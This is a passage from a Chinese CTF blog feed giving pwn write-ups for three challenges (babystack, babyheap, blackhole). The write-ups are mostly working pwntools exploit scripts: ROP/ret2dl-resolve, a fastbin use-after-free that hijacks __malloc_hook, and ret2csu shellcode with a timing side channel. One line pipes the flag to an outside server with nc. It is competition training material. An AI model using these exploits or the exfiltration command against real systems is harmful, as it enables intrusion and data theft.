+= p32(<span class="number">0x80482f0</span>) + p32(bss_start+<span class="number">0x100</span> - relplt) +p32(pppr)+ p32(<span class="number">0x804a124</span>)<span class="comment"># + p32(0) + p32(bss_start + 0x200)  +p32(0x100)</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] part2 '</span> ,len(rop1)</span><br><span class="line"><span class="comment">#rop = rop1 + p32(0x8048456)*((0x100-len(rop1))/4) </span></span><br><span class="line"><span class="comment">#p.send(rop1)</span></span><br><span class="line"></span><br><span class="line">rop2 = p32(<span class="number">0x0804a00c</span>)+p32(<span class="number">0x0001f407</span>)+ p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x1ef0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">12</span>) + <span class="string">'system\0\0'</span></span><br><span class="line">rop3 = rop2 + <span class="string">'/bin/sh\0'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] part3 '</span> ,len(rop3)</span><br><span class="line"><span class="comment">#rop = rop3 + 'a'*(0x100-len(rop3))</span></span><br><span class="line">p.send(part1+rop1+rop3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x080484eb : pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080484e8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080482e9 : pop ebx ; ret</span></span><br><span class="line"><span class="string">0x080484ea : pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x080484e9 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> 0x00000006 (SYMTAB)                     0x80481cc</span></span><br><span class="line"><span class="string"> 0x0000000b (SYMENT)                     16 (bytes)</span></span><br><span class="line"><span class="string"> 0x6ffffff0 (VERSYM)                     0x804827c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x /4wx 0x80481cc+16</span></span><br><span class="line"><span class="string">0x80481dc:0x0000001a0x000000000x000000000x00000012</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>拿到shell，发现此题没有输出…  解法是在服务器上开一个监听 然后执行 cat flag | nc your_server_ip your_server_port就可以了…</p><p>最后看到flag，果然这种方法就是预期解… </p><h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p>此题存在一个UAF漏洞，但是调用了calloc函数，这个函数会把堆块内数据清空，在此题中，和BLUECAKE大佬商量出一个新的利用方法，根据以前的利用思路，在可以对fastbin上任意地址分配与释放的题目中，通常可以劫持一个列表，作为跳板，在main_arena的某处写入一个0x60等数字，便于下一次分配，从而劫持到main_arena中的top chunk。再进一步有两种思路，1. 劫持到__free_hook之前，再分配几次，以system覆写__free_hook，从而得到shell。2. 劫持到栈上，通过未加canary保护的函数，写ROP执行system(‘/bin/sh’)。本次比赛发现了一种新的想法，将top写到__malloc_hook - 0x10这个位置，__malloc_hook-0x8是aligned<em>hook，一定是不为零的，通常是0x7fxxxxx，这样就可以分配覆写\</em>_malloc_hook为one_gadget，从而拿到shell了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#flag&#123;have_fun_with_fastbin&#125;</span></span><br><span class="line">context.log_level = <span class="string">"DEBUG"</span></span><br><span class="line">p = remote(<span class="string">"202.120.7.204"</span>,<span class="number">127</span>)<span class="comment">#process('./babyheap',env=&#123;'LD_PRELOAD': './libc-2.24.so'&#125;) # , env=&#123;'LD_PRELOAD':'./libc-2.24.so'&#125;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size:'</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">'Size:'</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'Content:'</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Command:'</span>, <span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Index:'</span>, str(index))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0</span></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0 1</span></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0 1 2 </span></span><br><span class="line">update(<span class="number">0</span>, <span class="number">0x59</span>, <span class="string">'a'</span>*<span class="number">0x58</span> + <span class="string">'\xc1'</span>)</span><br><span class="line">allocate(<span class="number">0x20</span>)   <span class="comment"># 0 1 2 3</span></span><br><span class="line">delete(<span class="number">1</span>)        <span class="comment"># 0 2 3</span></span><br><span class="line">allocate(<span class="number">0x58</span>)   <span class="comment"># 0 1 2 3</span></span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Chunk[2]: '</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00\x00'</span>)</span><br><span class="line">main_arena = leak_addr - <span class="number">88</span></span><br><span class="line">print(<span class="string">'main_arena is '</span> + hex(main_arena))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.24.so'</span>)<span class="comment">#('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">libcbase = main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 (2==3)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 4</span></span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 4 5 </span></span><br><span class="line">allocate(<span class="number">0x38</span>)  <span class="comment"># 0 1 2 3 4 5 6</span></span><br><span class="line">allocate(<span class="number">0x48</span>)  <span class="comment"># 0 1 2 3 4 5 6 7</span></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x59</span>, <span class="string">'a'</span>*<span class="number">0x58</span> + <span class="string">'\xf1'</span>)</span><br><span class="line">delete(<span class="number">5</span>)       <span class="comment"># 0 1 2 3 4 6 7</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x58</span>)  <span class="comment"># 0 1 2 3 4 5 6 7</span></span><br><span class="line">allocate(<span class="number">0x38</span>)  <span class="comment"># 0 1 2 3 4 5 6 7 8(6==8)</span></span><br><span class="line">delete(<span class="number">8</span>)       </span><br><span class="line">update(<span class="number">6</span>, <span class="number">0x8</span>, p64(<span class="number">0x60</span>))</span><br><span class="line">allocate(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">update(<span class="number">2</span>, <span class="number">0x8</span>, p64(main_arena + <span class="number">0x10</span>))</span><br><span class="line">allocate(<span class="number">0x58</span>) <span class="comment"># 0 1 2 3 4 5 6 7 8 </span></span><br><span class="line">allocate(<span class="number">0x58</span>) <span class="comment"># 0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line"></span><br><span class="line">malloc_hook_head = main_arena - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">update(<span class="number">9</span>, <span class="number">0x58</span>, p64(<span class="number">0</span>)*<span class="number">7</span> + p64(malloc_hook_head) + p64(<span class="number">0</span>) + p64(leak_addr)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x40</span>)</span><br><span class="line">one_gadget = libcbase + <span class="number">0x3f35a</span></span><br><span class="line">update(<span class="number">10</span>, <span class="number">8</span>, p64(one_gadget))</span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line"><span class="comment">#delete(3)</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x3f306 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x3f35a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xd695f execve("/bin/sh", rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x60] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45526 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4557a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1651 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf24cb execve("/bin/sh", rsp+0x60, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x60] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="blackhole"><a href="#blackhole" class="headerlink" title="blackhole"></a>blackhole</h1><p>此题属于babystack的升级版，但是在64位下return-to-dl-resolve需要泄露一个地址才可以使用，因此需要使用其他方法，题目给出一个hint，使用return-to-csu，这种方法是可以构造调用一个函数，并可以控制其三个参数。</p><p>并且，题目中增加了系统沙箱，控制只能调用open、read、mprotect、exit函数，最开始想到的是whctf里的sandbox题目，通过将程序跳转到32/64位，跳出沙箱的限制，但是明显是想多了。。。思路被我带歪了…和大佬搞了几个小时发现行不通… 最后只能通过基于时间的爆破来做。  并且发现自己的汇编语言写的真是渣…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random, string, subprocess, os, sys</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">os.chdir(os.path.dirname(os.path.realpath(__file__)))</span><br><span class="line"></span><br><span class="line">check_result = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(offset, guess, method)</span>:</span></span><br><span class="line">    <span class="comment"># p = process('./blackhole')</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, open('debug'))</span></span><br><span class="line">    <span class="keyword">global</span> check_result</span><br><span class="line">    check_result = <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        p = remote(<span class="string">'202.120.7.203'</span>, <span class="number">666</span>)</span><br><span class="line">        <span class="comment"># p = remote('127.0.0.1', 5555)</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">pow</span><span class="params">()</span>:</span></span><br><span class="line">            chal = p.recvline()[:<span class="number">-1</span>]</span><br><span class="line">            <span class="keyword">print</span> chal.encode(<span class="string">'hex'</span>)</span><br><span class="line">            <span class="keyword">for</span> c1 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">for</span> c2 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                    <span class="keyword">for</span> c3 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                        <span class="keyword">for</span> c4 <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">                            sol = <span class="string">''</span>.join(map(chr, (c1, c2, c3, c4)))</span><br><span class="line">                            <span class="keyword">if</span> sha256(chal + sol).hexdigest().startswith(<span class="string">'00000'</span>):</span><br><span class="line">                                p.send(sol)</span><br><span class="line">                                <span class="keyword">print</span> sha256(chal + sol).hexdigest()</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> pow() == <span class="keyword">True</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    output_buffer = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    elf = ELF(<span class="string">'./blackhole'</span>)</span><br><span class="line">    <span class="comment"># context.log_level = 'DEBUG'</span></span><br><span class="line"></span><br><span class="line">    pop6 = <span class="number">0x400A4A</span> </span><br><span class="line">    mov_call = <span class="number">0x400A30</span></span><br><span class="line">    bss = <span class="number">0x601100</span></span><br><span class="line">    pop_rbp = <span class="number">0x4007c0</span></span><br><span class="line">    leave_ret = <span class="number">0x4009A5</span>  </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">callfunc</span><span class="params">(func, arg1, arg2, arg3)</span>:</span></span><br><span class="line">        rop = p64(pop6)</span><br><span class="line">        rop += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(func) + p64(arg3) + p64(arg2) + p64(arg1)</span><br><span class="line">        rop += p64(mov_call)</span><br><span class="line">        <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line">    rop = <span class="string">'a'</span>*<span class="number">40</span></span><br><span class="line">    rop += callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss, <span class="number">320</span>) </span><br><span class="line">    rop += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    rop += p64(pop_rbp) + p64(bss - <span class="number">8</span>) + p64(leave_ret)</span><br><span class="line">    rop = rop.ljust(<span class="number">0x100</span>, <span class="string">'a'</span>)</span><br><span class="line">    <span class="comment"># p.send(rop)</span></span><br><span class="line">    output_buffer += rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    context.arch = <span class="string">'amd64'</span></span><br><span class="line">    shellcode = shellcraft.open(<span class="string">'/home/blackhole/flag'</span>, constants.O_RDONLY)</span><br><span class="line">    <span class="comment"># shellcode = shellcraft.open('/tmp/flag', constants.O_RDONLY)</span></span><br><span class="line">    shellcode += shellcraft.read(<span class="string">'rax'</span>, bss, <span class="number">60</span>)</span><br><span class="line">    shellcode += <span class="string">"mov al, byte ptr [%s]; cmp al, %s;"</span> % (hex(<span class="number">0x601100</span> + offset), hex(guess))</span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">'equal'</span>:</span><br><span class="line">        shellcode += <span class="string">"jne Exit;"</span> </span><br><span class="line">    <span class="keyword">elif</span> method == <span class="string">'smaller'</span>:</span><br><span class="line">        shellcode += <span class="string">"jl Exit;"</span> </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shellcode += <span class="string">"jg Exit;"</span> </span><br><span class="line"></span><br><span class="line">    shellcode += <span class="string">"Loop:"</span></span><br><span class="line">    shellcode += shellcraft.read(<span class="number">0</span>, bss + <span class="number">0x100</span>, <span class="number">0x10</span>) <span class="comment"># just block the program</span></span><br><span class="line">    shellcode += <span class="string">'jmp Loop;'</span></span><br><span class="line">    shellcode += <span class="string">'Exit:'</span> + shellcraft.exit(<span class="number">0</span>)</span><br><span class="line">    shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    bss_rop = callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, elf.got[<span class="string">'alarm'</span>], <span class="number">1</span>)</span><br><span class="line">    bss_rop += callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss, constants.SYS_mprotect)</span><br><span class="line">    bss_rop += callfunc(elf.got[<span class="string">'alarm'</span>], <span class="number">0x601000</span>, <span class="number">0x1000</span>, <span class="number">0x7</span>)</span><br><span class="line">    bss_rop += callfunc(elf.got[<span class="string">'read'</span>], <span class="number">0</span>, bss, len(shellcode))</span><br><span class="line">    bss_rop += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    bss_rop += p64(bss)</span><br><span class="line">    <span class="comment">#p.send(bss_rop)</span></span><br><span class="line">    <span class="comment"># print 'len(bss_rop) is ' + hex(len(bss_rop))</span></span><br><span class="line">    output_buffer += bss_rop</span><br><span class="line">    <span class="comment"># p.send('\x05' + 'a' * constants.SYS_mprotect)</span></span><br><span class="line">    <span class="comment"># output_buffer += '\x05' + 'a' * constants.SYS_mprotect</span></span><br><span class="line">    output_buffer += <span class="string">'\x85'</span> + <span class="string">'a'</span> * constants.SYS_mprotect</span><br><span class="line">    output_buffer += shellcode</span><br><span class="line"></span><br><span class="line">    old_time = time.time()</span><br><span class="line">    <span class="comment"># print len(output_buffer)</span></span><br><span class="line">    p.send(output_buffer.ljust(<span class="number">0x800</span>, <span class="string">'f'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">            p.sendline(<span class="string">'hack you'</span>)</span><br><span class="line">            print(<span class="string">"hack you"</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">        times = i</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        times = i</span><br><span class="line">        p.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> times &gt; <span class="number">3</span>:</span><br><span class="line">        check_result = <span class="keyword">True</span></span><br><span class="line">            </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binSearch</span><span class="params">(offset, start, end)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> start &lt;  end:</span><br><span class="line">        <span class="keyword">print</span> start, end, chr(start), chr(end)</span><br><span class="line">        medium = (start + end) / <span class="number">2</span></span><br><span class="line">        check(offset, medium, <span class="string">'equal'</span>)</span><br><span class="line">        <span class="keyword">if</span> check_result:</span><br><span class="line">            <span class="keyword">return</span> medium</span><br><span class="line">        </span><br><span class="line">        check(offset, medium, <span class="string">"smaller"</span>)</span><br><span class="line">        <span class="keyword">if</span> check_result:</span><br><span class="line">            start, end = medium, end</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            start, end = start, medium</span><br><span class="line">    <span class="keyword">return</span> start</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">'flag&#123;even_black_holes_leak_information_by_Hawking_radiation&#125;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag), <span class="number">60</span>):</span><br><span class="line">    result = binSearch(i, <span class="number">33</span>, <span class="number">128</span>)</span><br><span class="line">    flag += chr(result)</span><br><span class="line">    log.info(<span class="string">"flag is "</span> + flag)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      这次比赛和哈尔滨工业大学及中国科学技术大学的大佬们组了一支联队emmmm，比赛一共做出了三道PWN题。
    
    </summary>
    
    
      <category term="PWN" scheme="http://p4nda.top/tags/PWN/"/>
    
      <category term="CTF" scheme="http://p4nda.top/tags/CTF/"/>
    
  </entry>
  
</feed>
